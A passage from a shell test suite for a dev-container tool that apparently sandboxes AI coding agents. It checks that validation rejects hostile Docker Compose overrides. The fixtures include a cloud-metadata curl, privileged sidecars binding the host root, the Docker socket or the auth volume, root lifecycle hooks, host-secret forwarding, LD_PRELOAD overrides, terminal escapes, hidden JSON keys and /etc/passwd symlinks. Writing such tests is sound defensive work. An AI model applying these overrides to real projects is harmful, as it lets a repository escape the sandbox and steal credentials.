  "$TMP/precreate-exec/.devcontainer/devcontainer.json" \
  > "$TMP/precreate-exec/.devcontainer/devcontainer.json.tmp"
mv "$TMP/precreate-exec/.devcontainer/devcontainer.json.tmp" \
  "$TMP/precreate-exec/.devcontainer/devcontainer.json"
out=$(cd "$TMP/precreate-exec" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'must not define unmanaged features' \
  || fail "devcontainer feature root install bypassed managed validation"
echo "$out" | grep -q 'must not define unmanaged onCreateCommand' \
  || fail "pre-post-create lifecycle execution bypassed managed validation"

(cd "$TMP/precreate-exec" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
cat > "$TMP/precreate-exec/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    command: ["sh", "-c", "curl http://169.254.169.254/; sleep infinity"]
  attacker:
    image: busybox
    command: sleep infinity
    volumes:
      - ./hooks:/stolen-control
YAML
(cd "$TMP/precreate-exec" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/precreate-exec" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'changes managed command' \
  || { printf '%s\n' "$out" >&2; fail "devcontainer command could execute before post-create hardening"; }
echo "$out" | grep -q 'writable bind exposes protected project control paths' \
  || fail "nested .devcontainer bind escaped writable-control detection"

# A plain `docker compose config` omits profile-gated services, but Compose
# still starts one that devcontainer.json runServices names. Validation must
# resolve every profile, and runServices (like any key the template does not
# define) is outside the devcontainer.json allow-list.
new_project "$TMP/profiles"
cat > "$TMP/profiles/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  hidden:
    image: busybox
    profiles: ["never-active"]
    privileged: true
    volumes:
      - /:/host
YAML
(cd "$TMP/profiles" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/profiles" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'service hidden: privileged: true' \
  || fail "profile-gated privileged service was hidden from validation"
echo "$out" | grep -q 'service hidden: binds a sensitive host path outside the project: /' \
  || fail "profile-gated host-root bind was hidden from validation"
if (cd "$TMP/profiles" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
    "$ROOT/aic" validate </dev/null >/dev/null 2>&1); then
  fail "validate accepted an untrusted profile-gated service"
fi
# waitFor is managed: VS Code must not open a terminal (and start an agent)
# before post-create has reset the managed memory files and locked config.
sed -e 's|^  "customizations": {|  "runServices": ["devcontainer", "hidden"],\
  "shutdownAction": "none",\
  "customizations": {|' \
  -e 's|^  "waitFor": "postCreateCommand"|  "waitFor": "onCreateCommand"|' \
  "$TMP/profiles/.devcontainer/devcontainer.json" \
  > "$TMP/profiles/.devcontainer/devcontainer.json.tmp"
mv "$TMP/profiles/.devcontainer/devcontainer.json.tmp" \
  "$TMP/profiles/.devcontainer/devcontainer.json"
out=$(cd "$TMP/profiles" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'must not define unmanaged runServices' \
  || fail "devcontainer.json runServices bypassed managed validation"
echo "$out" | grep -q 'must not define unmanaged shutdownAction' \
  || fail "devcontainer.json top-level keys are not an allow-list"
echo "$out" | grep -q 'managed anchor waitFor differs from the template' \
  || fail "devcontainer.json waitFor can let VS Code open a terminal before post-create"
(cd "$TMP/profiles" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
sed 's|^    "vscode": {|    "codespaces": {},\
    "vscode": {|' \
  "$TMP/profiles/.devcontainer/devcontainer.json" \
  > "$TMP/profiles/.devcontainer/devcontainer.json.tmp"
mv "$TMP/profiles/.devcontainer/devcontainer.json.tmp" \
  "$TMP/profiles/.devcontainer/devcontainer.json"
out=$(cd "$TMP/profiles" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'customizations may contain only vscode.extensions and vscode.settings' \
  || fail "devcontainer.json customizations accepted an unmanaged section"
# The Dev Containers CLI scanner ends a // comment at a bare carriage return,
# while a \n-only reading keeps the rest of the line as comment. Keys after it
# would be live for Dev Containers but invisible to validation.
(cd "$TMP/profiles" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
node -e '
  const fs = require("fs"), file = process.argv[1];
  const source = fs.readFileSync(file, "utf8");
  const patched = source.replace(/("postCreateCommand": "[^"]*")/,
    "$1 // hidden\r, \"runServices\": [\"devcontainer\", \"hidden\"]");
  if (patched === source) process.exit(2);
  fs.writeFileSync(file, patched);
' "$TMP/profiles/.devcontainer/devcontainer.json"
out=$(cd "$TMP/profiles" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'contains a bare carriage return' \
  || fail "a bare carriage return hid devcontainer.json keys from validation"

# Compose lifecycle hooks run with exec semantics: each entry may set its own
# user and privileged flag, on the devcontainer or on any added service. Keys
# the validator does not review, and labels that Dev Containers or the legacy
# ownership checks trust, need exact trust as well.
new_project "$TMP/service-keys"
cat > "$TMP/service-keys/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    post_start:
      - command: ["sh", "-c", "id > /workspace/hook-ran"]
        user: root
        privileged: true
    labels:
      devcontainer.metadata: '[{"remoteUser":"root"}]'
    logging:
      driver: syslog
    cgroup_parent: agent.slice
    sysctls:
      net.ipv4.ip_unprivileged_port_start: 0
  helper:
    image: busybox
    command: sleep infinity
    pre_stop:
      - command: ["true"]
    develop:
      watch:
        - action: sync+exec
          path: ./hooks
          target: /hooks
          exec:
            command: ["id"]
            privileged: true
    deploy:
      resources:
        reservations:
          devices:
            - capabilities: [gpu]
YAML
(cd "$TMP/service-keys" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/service-keys" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'service devcontainer: post_start lifecycle hook runs commands with privileged: true' \
  || fail "privileged post_start hook bypassed validation"
echo "$out" | grep -q 'service helper: pre_stop lifecycle hook runs commands' \
  || fail "pre_stop hook on an added service bypassed validation"
echo "$out" | grep -q 'service helper: develop.watch exec hook runs commands' \
  || fail "develop.watch exec hook bypassed validation"
echo "$out" | grep -q 'service devcontainer: cgroup_parent is not a reviewed Compose service key' \
  || fail "Compose service keys are not an allow-list"
echo "$out" | grep -q 'service devcontainer: logging driver syslog can send container output' \
  || fail "network logging driver bypassed validation"
echo "$out" | grep -q 'service devcontainer: sysctls change kernel settings of a managed service' \
  || fail "managed-service sysctls bypassed validation"
echo "$out" | grep -q 'sets reserved label devcontainer.metadata' \
  || fail "reserved Dev Containers label bypassed validation"
echo "$out" | grep -q 'service helper: deploy reserves host devices' \
  || fail "deploy device reservation bypassed validation"
if (cd "$TMP/service-keys" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
    "$ROOT/aic" validate </dev/null >/dev/null 2>&1); then
  fail "validate accepted untrusted lifecycle hooks"
fi

# The allow-lists must not add friction to the documented override examples or
# an ordinary database sidecar.
cat > "$TMP/service-keys/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    environment:
      DATABASE_URL: postgresql://user:pass@host.docker.internal:5432/mydb
      AIC_FREEZE_TOOLS: "1"
    extra_hosts:
      - "host.docker.internal:host-gateway"
    pids_limit: 8192
    mem_limit: 8g
    cpus: 4
    volumes:
      - myproject-venv:/workspace/.venv
      - myproject-uv-cache:/home/vscode/.cache/uv
  db:
    image: postgres:16
    restart: unless-stopped
    environment:
      POSTGRES_PASSWORD: dev
    ports:
      - "127.0.0.1:5432:5432"
    healthcheck:
      test: ["CMD", "pg_isready"]
    ulimits:
      nofile: 65536
    labels:
      app.example/role: database
    deploy:
      resources:
        limits:
          memory: 1g
    logging:
      driver: json-file
      options:
        max-size: 10m
    sysctls:
      net.core.somaxconn: 1024
    develop:
      watch:
        - path: ./hooks
          action: restart
volumes:
  myproject-venv:
  myproject-uv-cache:
YAML
(cd "$TMP/service-keys" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/service-keys" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null 2>&1) \
  || { printf '%s\n' "$out" >&2; fail "documented override examples no longer validate"; }

# Host-shell interpolation is a separate boundary from literal project
# environment. A checkout must not be able to forward an exported token into
# its container/build simply by spelling ${TOKEN}; Compose's escaped $${TOKEN}
# form remains a literal and does not need trust.
new_project "$TMP/host-interpolation"
cat > "$TMP/host-interpolation/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    environment:
      FORWARDED_TOKEN: ${AIC_HOST_ONLY_SECRET}
YAML
(cd "$TMP/host-interpolation" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/host-interpolation" && AIC_HOST_ONLY_SECRET=must-not-appear \
  AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'host environment interpolation' \
  || fail "override host-environment interpolation bypassed trust gating"
echo "$out" | grep -q 'must-not-appear' \
  && fail "validation diagnostics disclosed an interpolated host secret"
cat > "$TMP/host-interpolation/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    environment:
      - AIC_HOST_ONLY_SECRET
YAML
(cd "$TMP/host-interpolation" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/host-interpolation" && AIC_HOST_ONLY_SECRET=must-not-appear \
  AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'forwards host environment variable' \
  || fail "bare Compose host-environment pass-through bypassed trust gating"
echo "$out" | grep -q 'must-not-appear' \
  && fail "pass-through diagnostics disclosed a host secret"
cat > "$TMP/host-interpolation/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    environment:
      LITERAL_TEMPLATE: $${AIC_HOST_ONLY_SECRET}
YAML
(cd "$TMP/host-interpolation" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/host-interpolation" && AIC_HOST_ONLY_SECRET=must-not-appear \
  AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'host environment interpolation' \
  && fail "escaped literal Compose interpolation was needlessly trust-gated"

# Compose environment has higher precedence than managed devcontainer/image
# values. Protect shell/Git/tool-home policy and the proxy endpoint, while an
# unrelated literal application value remains prompt-free.
new_project "$TMP/protected-environment"
cat > "$TMP/protected-environment/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    environment:
      DATABASE_URL: postgresql://db/app
      ZDOTDIR: /workspace/.agent-zsh
      GIT_CONFIG_GLOBAL: /workspace/.agent-gitconfig
      CLAUDE_CONFIG_DIR: /home/vscode/.config/gh
      DOCKER_HOST: tcp://host.docker.internal:2375
      LD_PRELOAD: /workspace/agent.so
YAML
(cd "$TMP/protected-environment" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/protected-environment" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
for key in ZDOTDIR GIT_CONFIG_GLOBAL CLAUDE_CONFIG_DIR DOCKER_HOST LD_PRELOAD; do
  echo "$out" | grep -q "environment $key overrides" \
    || fail "Compose environment bypass for $key was not trust-gated"
done
cat > "$TMP/protected-environment/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    environment:
      DATABASE_URL: postgresql://db/app
YAML
(cd "$TMP/protected-environment" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/protected-environment" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'requests extra host access' \
  && fail "ordinary literal project environment was needlessly trust-gated"

# Findings render repository-controlled values on the host terminal. Control
# bytes must be escaped rather than interpreted as colors, links, or cursor
# movement.
new_project "$TMP/terminal-output"
cat > "$TMP/terminal-output/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    runtime: "\u001b[31mspoof"
YAML
(cd "$TMP/terminal-output" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/terminal-output" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
case "$out" in
  *$'\033'*) fail "validation emitted a raw terminal escape from repository input" ;;
esac
echo "$out" | grep -Fq '\u001b[31mspoof' \
  || fail "validation did not render a repository terminal escape safely"

# Docker exposure has three coherent, sync-preserved modes. Read and write
# access require matching consent outside the repository, so editing Compose
# cannot silently grant a checkout more host visibility.
new_project "$TMP/docker-modes"
(cd "$TMP/docker-modes" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" sync --docker-read >/dev/null)
for key in CONTAINERS EVENTS IMAGES INFO NETWORKS VOLUMES; do
  grep -qE "^[[:space:]]*$key:[[:space:]]*1[[:space:]]*$" \
    "$TMP/docker-modes/.devcontainer/docker-compose.yml" \
    || fail "--docker-read did not enable $key"
done
grep -qE '^[[:space:]]*POST:[[:space:]]*0[[:space:]]*$' \
  "$TMP/docker-modes/.devcontainer/docker-compose.yml" \
  || fail "--docker-read enabled Docker writes"
(cd "$TMP/docker-modes" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" sync >/dev/null)
grep -qE '^[[:space:]]*CONTAINERS:[[:space:]]*1[[:space:]]*$' \
  "$TMP/docker-modes/.devcontainer/docker-compose.yml" \
  || fail "plain sync did not preserve Docker read mode"
out=$(cd "$TMP/docker-modes" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'requests extra host access' \
  && fail "explicit Docker read consent was not recognized"

sed -E 's/^([[:space:]]*)(POST|BUILD):[[:space:]]*0[[:space:]]*$/\1\2: 1/' \
  "$TMP/docker-modes/.devcontainer/docker-compose.yml" \
  > "$TMP/docker-modes/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/docker-modes/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/docker-modes/.devcontainer/docker-compose.yml"
out=$(cd "$TMP/docker-modes" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'read-write mode is enabled' \
  || fail "repository Docker mode escalation bypassed external consent"
(cd "$TMP/docker-modes" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" sync --docker >/dev/null)
out=$(cd "$TMP/docker-modes" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'requests extra host access' \
  && fail "explicit Docker write consent was not recognized"
(cd "$TMP/docker-modes" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" sync --no-docker >/dev/null)
for key in CONTAINERS EVENTS IMAGES INFO NETWORKS VOLUMES POST BUILD; do
  grep -qE "^[[:space:]]*$key:[[:space:]]*0[[:space:]]*$" \
    "$TMP/docker-modes/.devcontainer/docker-compose.yml" \
    || fail "--no-docker did not disable $key"
done

# Pre-consent releases exposed object reads in every generated project. Sync
# must not preserve an unconsented repository value and then block the first
# startup for approval; reset to none and leave an explicit opt-in hint.
new_project "$TMP/legacy-unconsented-docker"
sed -E \
  -e '/^name:[[:space:]]/d' \
  -e 's/^([[:space:]]*)(CONTAINERS|EVENTS|IMAGES|INFO|NETWORKS|VOLUMES):[[:space:]]*0[[:space:]]*$/\1\2: 1/' \
  "$TMP/legacy-unconsented-docker/.devcontainer/docker-compose.yml" \
  > "$TMP/legacy-unconsented-docker/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/legacy-unconsented-docker/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/legacy-unconsented-docker/.devcontainer/docker-compose.yml"
out=$(cd "$TMP/legacy-unconsented-docker" && XDG_STATE_HOME="$TMP/state" \
  AIC_HOME="$ROOT" "$ROOT/aic" sync 2>&1)
echo "$out" | grep -q "existing Docker read access has no matching host consent; resetting to 'none'" \
  || fail "legacy sync did not explain its unconsented Docker-read reset"
for key in CONTAINERS EVENTS IMAGES INFO NETWORKS VOLUMES POST BUILD; do
  grep -qE "^[[:space:]]*$key:[[:space:]]*0[[:space:]]*$" \
    "$TMP/legacy-unconsented-docker/.devcontainer/docker-compose.yml" \
    || fail "legacy sync preserved unconsented Docker $key access"
done
out=$(cd "$TMP/legacy-unconsented-docker" && XDG_STATE_HOME="$TMP/state" \
  AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'requests extra host access' \
  && fail "legacy Docker reset still left a startup trust prompt"

# Host-side init/sync must never follow repository-provided symlinks.
mkdir "$TMP/outside"
ln -s "$TMP/outside" "$TMP/symlink-devcontainer"
mkdir "$TMP/symlink-root"
mv "$TMP/symlink-devcontainer" "$TMP/symlink-root/.devcontainer"
if (cd "$TMP/symlink-root" && AIC_HOME="$ROOT" "$ROOT/aic" init --force --with codex --shell zsh >/dev/null 2>&1); then
  fail "init --force accepted a symlinked .devcontainer"
fi
[ ! -e "$TMP/outside/devcontainer.json" ] || fail "symlink target was overwritten"

new_project "$TMP/symlink-file"
target="$TMP/outside-target"
: > "$target"
rm "$TMP/symlink-file/.devcontainer/docker-compose.yml"
ln -s "$target" "$TMP/symlink-file/.devcontainer/docker-compose.yml"
if (cd "$TMP/symlink-file" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1); then
  fail "sync accepted a symlinked managed file"
fi
[ ! -s "$target" ] || fail "managed-file symlink target was overwritten"

# vscode-settings.json is strict JSON and cannot escape its settings object.
new_project "$TMP/settings"
printf '%s\n' '{"safe":true}, "mounts":["/:/host"], "x": {' \
  > "$TMP/settings/.devcontainer/vscode-settings.json"
out=$(cd "$TMP/settings" && AIC_HOME="$ROOT" "$ROOT/aic" sync 2>&1)
echo "$out" | grep -q 'must be a strict JSON object' || fail "malformed settings were not rejected"
grep -q '"mounts"' "$TMP/settings/.devcontainer/devcontainer.json" \
  && fail "settings escaped into top-level devcontainer config"

# Project-owned settings cannot override aic's managed safety/UX settings via
# duplicate JSON keys (VS Code otherwise accepts the last value).
printf '%s\n' \
  '{"claude-code.allowDangerouslySkipPermissions":false,"editor.wordWrap":"on"}' \
  > "$TMP/settings/.devcontainer/vscode-settings.json"
out=$(cd "$TMP/settings" && AIC_HOME="$ROOT" "$ROOT/aic" sync 2>&1)
echo "$out" | grep -q 'key managed by aic: claude-code.allowDangerouslySkipPermissions' \
  || fail "managed VS Code setting collision was not reported"
[ "$(grep -c '"claude-code.allowDangerouslySkipPermissions": true' \
    "$TMP/settings/.devcontainer/devcontainer.json")" = "1" ] \
  || fail "project setting overrode or duplicated an aic-managed setting"
grep -q '"claude-code.allowDangerouslySkipPermissions": false' \
  "$TMP/settings/.devcontainer/devcontainer.json" \
  && fail "project-owned managed-setting collision survived sync"
grep -q '"editor.wordWrap": "on"' "$TMP/settings/.devcontainer/devcontainer.json" \
  || fail "non-conflicting project setting was dropped"

# Switching build -> pull removes every managed build artifact and stays pull.
new_project "$TMP/mode"
(cd "$TMP/mode" && AIC_HOME="$ROOT" "$ROOT/aic" sync --build >/dev/null)
[ -f "$TMP/mode/.devcontainer/Dockerfile" ] || fail "build sync did not install Dockerfile"
(cd "$TMP/mode" && AIC_HOME="$ROOT" "$ROOT/aic" sync --pull >/dev/null)
[ ! -e "$TMP/mode/.devcontainer/Dockerfile" ] || fail "pull sync left build Dockerfile behind"
(cd "$TMP/mode" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
[ ! -e "$TMP/mode/.devcontainer/Dockerfile" ] || fail "plain sync flipped back to build mode"

# Personal shell overlay (opt-in): project-owned shell-rc.zsh / p10k.zsh are
# never rewritten by sync, the host-seed sanitizer conduit is wired, the files
# are control-boundary paths (no symlinks), and build mode ships the renamed
# root-owned installer while a build->pull switch keeps the project-owned files.
new_project "$TMP/overlay"
printf 'alias ll="ls -la"\n' > "$TMP/overlay/.devcontainer/shell-rc.zsh"
printf 'typeset -g POWERLEVEL9K_MODE=nerdfont-complete\n' > "$TMP/overlay/.devcontainer/p10k.zsh"
(cd "$TMP/overlay" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
grep -q 'alias ll=' "$TMP/overlay/.devcontainer/shell-rc.zsh" \
  || fail "sync clobbered project-owned shell-rc.zsh"
grep -q 'POWERLEVEL9K_MODE' "$TMP/overlay/.devcontainer/p10k.zsh" \
  || fail "sync clobbered project-owned p10k.zsh"
grep -q '/raw-host-seed/aic-config:ro' "$TMP/overlay/.devcontainer/docker-compose.yml" \
  || fail "sanitizer is missing the personal-overlay host-seed mount"
rm "$TMP/overlay/.devcontainer/shell-rc.zsh"
ln -s /etc/passwd "$TMP/overlay/.devcontainer/shell-rc.zsh"
if (cd "$TMP/overlay" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1); then
  fail "sync accepted a symlinked project-owned shell-rc.zsh"
fi
rm "$TMP/overlay/.devcontainer/shell-rc.zsh"
(cd "$TMP/overlay" && AIC_HOME="$ROOT" "$ROOT/aic" sync --build >/dev/null)
[ -f "$TMP/overlay/.devcontainer/aic-lock-user-config" ] \
  || fail "build sync did not install aic-lock-user-config"
[ ! -e "$TMP/overlay/.devcontainer/aic-lock-gitconfig" ] \
  || fail "build sync installed the old aic-lock-gitconfig name"
(cd "$TMP/overlay" && AIC_HOME="$ROOT" "$ROOT/aic" sync --pull >/dev/null)
[ ! -e "$TMP/overlay/.devcontainer/aic-lock-user-config" ] \
  || fail "pull sync left the build-mode installer behind"
[ -f "$TMP/overlay/.devcontainer/p10k.zsh" ] \
  || fail "pull sync removed the project-owned p10k.zsh"

# Personal statusline overlay (opt-in, Claude Code): every supported extension is
# a project-owned control-boundary path — survives sync, never a symlink. The
# host statusLine command itself is never seeded; only this file crosses.
new_project "$TMP/statusline"
for ext in sh mjs js py; do
  printf '# aic statusline %s\n' "$ext" > "$TMP/statusline/.devcontainer/statusline.$ext"
done
(cd "$TMP/statusline" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
for ext in sh mjs js py; do
  grep -q "aic statusline $ext" "$TMP/statusline/.devcontainer/statusline.$ext" \
    || fail "sync clobbered project-owned statusline.$ext"
  rm "$TMP/statusline/.devcontainer/statusline.$ext"
  ln -s /etc/passwd "$TMP/statusline/.devcontainer/statusline.$ext"
  if (cd "$TMP/statusline" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1); then
    fail "sync accepted a symlinked project-owned statusline.$ext"
  fi
  rm "$TMP/statusline/.devcontainer/statusline.$ext"
done

# Resolved-Compose validation inspects every service and aliases, not raw YAML
# patterns only. Non-interactive startup must fail before devcontainer/Docker up.
new_project "$TMP/unsafe"
cat > "$TMP/unsafe/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  attacker:
    image: busybox
    privileged: true
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - stolen-auth:/auth
volumes:
  stolen-auth:
    external: true
    name: aic-auth-global
YAML
(cd "$TMP/unsafe" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/unsafe" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'service attacker: privileged: true' || fail "sidecar privilege was not resolved/flagged"
echo "$out" | grep -q 'mounts the Docker socket' || fail "sidecar socket mount was not flagged"
echo "$out" | grep -q 'aliases protected physical volume aic-auth-global' || fail "protected-volume alias was not flagged"
if (cd "$TMP/unsafe" && AIC_HOME="$ROOT" "$ROOT/aic" up </dev/null >/dev/null 2>&1); then
  fail "unsafe non-interactive startup did not fail closed"
fi
trust_before=$(find "$TMP/state/aicontainer" -path '*/trust/*' -type f 2>/dev/null | wc -l | tr -d ' ')
if (cd "$TMP/unsafe" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
    "$ROOT/aic" validate </dev/null >/dev/null 2>&1); then
  fail "validate accepted an untrusted host-boundary expansion"
fi
trust_after=$(find "$TMP/state/aicontainer" -path '*/trust/*' -type f 2>/dev/null | wc -l | tr -d ' ')
[ "$trust_before" = "$trust_after" ] || fail "validate wrote trust state"
out=$(cd "$TMP/unsafe" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" preflight </dev/null 2>&1)
echo "$out" | grep -q 'resolved project configuration requests extra host access' \
  || fail "preflight did not report unsafe resolved configuration"
echo "$out" | grep -q 'trust boundary for project' \
  || fail "preflight omitted its boundary summary after findings"
trust_after=$(find "$TMP/state/aicontainer" -path '*/trust/*' -type f 2>/dev/null | wc -l | tr -d ' ')
[ "$trust_before" = "$trust_after" ] || fail "preflight wrote trust state"

# Compose merges mounts by target, so an override entry with a managed target
# replaces the whole managed mount. The validator must compare the full mount
# spec: dropping or changing volume.subpath would otherwise expose the whole
# global auth volume, and bind.* options on a managed project bind would pass.
new_project "$TMP/mount-spec"
for subpath_line in '' '          subpath: claude'; do
  {
    printf '%s\n' 'services:' '  devcontainer:' '    volumes:' \
      '      - type: volume' '        source: aic-auth-global' \
      '        target: /home/vscode/.config/aic-auth/signing'
    if [ -n "$subpath_line" ]; then
      printf '%s\n' '        volume:' "$subpath_line"
    fi
  } > "$TMP/mount-spec/.devcontainer/docker-compose.override.yml"
  (cd "$TMP/mount-spec" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
  out=$(cd "$TMP/mount-spec" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
    "$ROOT/aic" validate </dev/null 2>&1) \
    && fail "validate accepted a replaced aic-auth-global subpath mount (${subpath_line:-no subpath})"
  echo "$out" | grep -q 'remounts protected volume aic-auth-global' \
    || fail "replaced aic-auth-global subpath mount was not flagged (${subpath_line:-no subpath})"
done
cat > "$TMP/mount-spec/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    volumes:
      - type: bind
        source: ../.git
        target: /workspace/.git
        bind:
          propagation: rshared
YAML
(cd "$TMP/mount-spec" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/mount-spec" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null 2>&1) \
  && fail "validate accepted changed bind options on the managed .git mount"
echo "$out" | grep -q 'removes managed protection for /workspace/.git' \
  || fail "changed bind options on the managed .git mount were not flagged"

# Managed service replacement is detected after Compose merge.
cat > "$TMP/unsafe/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  socket-proxy:
    image: busybox
YAML
(cd "$TMP/unsafe" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/unsafe" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'reserved socket-proxy service' || fail "socket-proxy replacement was not flagged"

# Container targets matter as much as host sources: project-local content must
# not mask fixed sudo helpers, managed policy, or the root-only socket path.
new_project "$TMP/target-mask"
printf '#!/bin/sh\n' > "$TMP/target-mask/.devcontainer/fake-helper"
printf '{}\n' > "$TMP/target-mask/.devcontainer/fake-policy"
cat > "$TMP/target-mask/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    volumes:
      - ./fake-helper:/usr/local/bin/aic-firewall:ro
    tmpfs:
      - /run/aic-host
    configs:
      - source: fake-policy
        target: /etc/codex/requirements.toml
configs:
  fake-policy:
    file: ./fake-policy
YAML
(cd "$TMP/target-mask" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/target-mask" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'masks protected managed path /usr/local/bin/aic-firewall' \
  || fail "project-local bind could mask the privileged helper"
echo "$out" | grep -q 'tmpfs masks protected managed path /run/aic-host' \
  || fail "tmpfs could mask the root-only Docker socket path"
echo "$out" | grep -q 'configs mount masks protected managed path /etc/codex/requirements.toml' \
  || fail "config mount could mask managed Codex policy"

# Even a Dockerfile.project whose final FROM looks safe executes project-owned
# build instructions as root and can replace fixed helpers/policy. It therefore
# requires explicit trust just like every other host-boundary expansion.
new_project "$TMP/project-build"
printf 'FROM ghcr.io/stefanoginella/aicontainer:v%s\nRUN true\n' "$version" \
  > "$TMP/project-build/.devcontainer/Dockerfile.project"
cat > "$TMP/project-build/.devcontainer/docker-compose.override.yml" <<YAML
services:
  devcontainer:
    image: myproject-devcontainer:v$version
    build:
      context: .
      dockerfile: Dockerfile.project
YAML
(cd "$TMP/project-build" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
out=$(cd "$TMP/project-build" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'project-owned Dockerfile as root' \
  || fail "safe-looking project Dockerfile was not trust-gated"
if (cd "$TMP/project-build" && AIC_HOME="$ROOT" "$ROOT/aic" up </dev/null >/dev/null 2>&1); then
  fail "project-owned root build did not fail closed non-interactively"
fi

# Project-owned files that run code in the container ride along in a clone and
# run with no prompt, with open egress and the tool logins. Each one needs exact
# trust, like a project build. vscode-extensions / vscode-settings.json are
# judged from the merged devcontainer.json, which a repository can also commit.
new_project "$TMP/project-code"
(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null >/dev/null 2>&1) \
  || fail "clean project failed validation before the project-code cases"
